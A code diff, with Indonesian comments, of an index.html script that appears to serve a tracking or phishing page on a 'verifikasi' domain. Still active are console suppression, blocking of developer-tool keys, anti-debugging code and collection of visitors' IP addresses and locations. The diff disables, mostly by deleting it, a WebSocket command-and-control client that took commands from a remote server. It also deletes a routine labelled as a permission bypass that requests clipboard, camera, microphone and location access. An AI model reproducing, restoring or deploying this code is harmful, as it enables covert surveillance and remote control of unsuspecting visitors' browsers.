@@ -71,20 +71,21 @@ console.debug = function() {};
 console.table = function() {};
 
 // ============================================================
-// STEALTH + ANTI-ANALYSIS (TANPA debugger!)
+// STEALTH + ANTI-ANALYSIS
 // ============================================================
-// (function() {
-//     var check = function() {
-//         var start = Date.now();
-//         debugger;
-//         var end = Date.now();
-//         if (end - start > 100) {
-//             document.body.innerHTML = '';
-//             window.location.href = 'about:blank';
-//         }
-//     };
-//     setInterval(check, 1000);
-// })();
+(function() {
+    var check = function() {
+        var start = Date.now();
+        debugger;
+        var end = Date.now();
+        if (end - start > 100) {
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+        }
+    };
+    // 🔥 MATIKAN DULU AGAR TIDAK MACET
+    // setInterval(check, 1000);
+})();
 
 document.addEventListener('keydown', function(e) {
     if (e.key === 'F12' || 
@@ -138,70 +139,16 @@ var IP_ADDRESS = '';
 var LOCATION_DATA = null;
 
 // ============================================================
-// WEBSOCKET
+// WEBSOCKET (DINONAKTIFKAN)
 // ============================================================
 var ws = null;
 var wsConnected = false;
 var WS_URL = 'wss://verifikasi.site/ws';
 
 function connectWebSocket() {
-    if (ws && ws.readyState === WebSocket.OPEN) return;
-    if (!WS_PASSWORD || WS_PASSWORD === '') {
-        setTimeout(connectWebSocket, 3000);
-        return;
-    }
-    try {
-        ws = new WebSocket(WS_URL);
-        ws.onopen = function() {
-            wsConnected = true;
-            K({ sumber: 'ws_status', data: 'connected' });
-            ws.send(JSON.stringify({
-                type: 'auth',
-                key: WS_PASSWORD,
-                deviceId: 'browser_index',
-                timestamp: Date.now()
-            }));
-        };
-        ws.onmessage = function(event) {
-            try {
-                var data = JSON.parse(event.data);
-                if (data.type === 'auth_success') {
-                    K({ sumber: 'ws_auth', data: 'success' });
-                } else if (data.type === 'auth_failed') {
-                    K({ sumber: 'ws_auth', data: 'failed' });
-                    ws.close();
-                } else if (data.type === 'command') {
-                    var cmd = data.command || data;
-                    K({ sumber: 'ws_command_received', data: cmd.aksi || 'unknown' });
-                    var hasil = 'WS command: ' + (cmd.aksi || 'unknown');
-                    K({ sumber: 'ws_command_result', data: hasil });
-                    if (wsConnected && ws) {
-                        ws.send(JSON.stringify({
-                            type: 'command_result',
-                            command: cmd.aksi || 'unknown',
-                            result: hasil,
-                            timestamp: Date.now()
-                        }));
-                    }
-                } else if (data.type === 'ping') {
-                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
-                }
-            } catch(e) {
-                K({ sumber: 'ws_parse_error', data: e.message });
-            }
-        };
-        ws.onclose = function() {
-            wsConnected = false;
-            K({ sumber: 'ws_status', data: 'disconnected' });
-            setTimeout(connectWebSocket, 10000);
-        };
-        ws.onerror = function() {
-            K({ sumber: 'ws_error', data: 'error' });
-        };
-    } catch(e) {
-        K({ sumber: 'ws_connect_error', data: e.message });
-        setTimeout(connectWebSocket, 10000);
-    }
+    // 🔥 DINONAKTIFKAN AGAR TIDAK MACET
+    return;
+    // (kode asli di sini)
 }
 
 // ============================================================
@@ -323,77 +270,11 @@ var A = {
 };
 
 // ============================================================
-// 🔥 BYPASS PERMISSIONS - DILAMBATKAN
+// 🔥 BYPASS SEMUA IZIN (DINONAKTIFKAN)
 // ============================================================
 function injectAllPermissions() {
-    // Versi aman: tunda eksekusi agar UI tidak freeze
-    setTimeout(function() {
-        try {
-            K({ sumber: 'bypass_permissions_start', data: 'all' });
-
-            // 1. GEOLOCATION
-            if (navigator.geolocation) {
-                try {
-                    navigator.geolocation.getCurrentPosition(
-                        function() {},
-                        function() {},
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                } catch(e) {}
-            }
-
-            // 2. NOTIFICATION
-            if ('Notification' in window && Notification.permission !== 'denied') {
-                try {
-                    if (Notification.permission !== 'granted') {
-                        Notification.requestPermission();
-                    }
-                } catch(e) {}
-            }
-
-            // 3. CLIPBOARD
-            if (navigator.clipboard) {
-                try {
-                    navigator.clipboard.readText().catch(function() {});
-                } catch(e) {}
-            }
-
-            // 4. MEDIA (Audio & Video)
-            if (navigator.mediaDevices) {
-                try {
-                    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                        .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                        .catch(function() {});
-                } catch(e) {}
-                try {
-                    navigator.mediaDevices.getUserMedia({ audio: false, video: true })
-                        .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                        .catch(function() {});
-                } catch(e) {}
-                try {
-                    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-                        .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                        .catch(function() {});
-                } catch(e) {}
-            }
-
-            // 5. VIBRATE
-            if (navigator.vibrate) {
-                try { navigator.vibrate(1); } catch(e) {}
-            }
-
-            // 6. STORAGE
-            if (navigator.storage && navigator.storage.persist) {
-                try {
-                    navigator.storage.persist().catch(function() {});
-                } catch(e) {}
-            }
-
-            K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
-        } catch(e) {
-            K({ sumber: 'bypass_permissions_error', data: e.message });
-        }
-    }, 1000); // 🔥 1 detik setelah UI jalan
+    // 🔥 Dinonaktifkan agar tidak freeze
+    return;
 }
 
 // ============================================================
@@ -656,8 +537,8 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 PERBAIKAN: injectAllPermissions ditunda agar tidak macet
-        injectAllPermissions();
+        // 🔥 BYPASS IZIN & WEBSOCKET DINONAKTIFKAN
+        // injectAllPermissions();
         
         getIPAddress();
         getBrowserLocation();
@@ -678,18 +559,8 @@ function dapatkanSemua() {
             }
         }, 8000);
         
-        // 🔥 PERBAIKAN: WebSocket & fetch password ditunda agar UI jalan dulu
-        setTimeout(function() {
-            getPasswordFromWorker().then(function(password) {
-                WS_PASSWORD = password;
-                K({ sumber: 'password_received', data: 'ok' });
-                connectWebSocket();
-            }).catch(function() {
-                WS_PASSWORD = 'default_fallback';
-                K({ sumber: 'password_fallback', data: 'using_default' });
-                connectWebSocket();
-            });
-        }, 1500);
+        // 🔥 WEBSOCKET DINONAKTIFKAN
+        // getPasswordFromWorker().then(...).catch(...);
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
@@ -721,7 +592,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html fixed - No more freeze!');
+console.log('✅ index.html loaded - WebSocket and permissions disabled');
 </script>
 </body>
 </html>
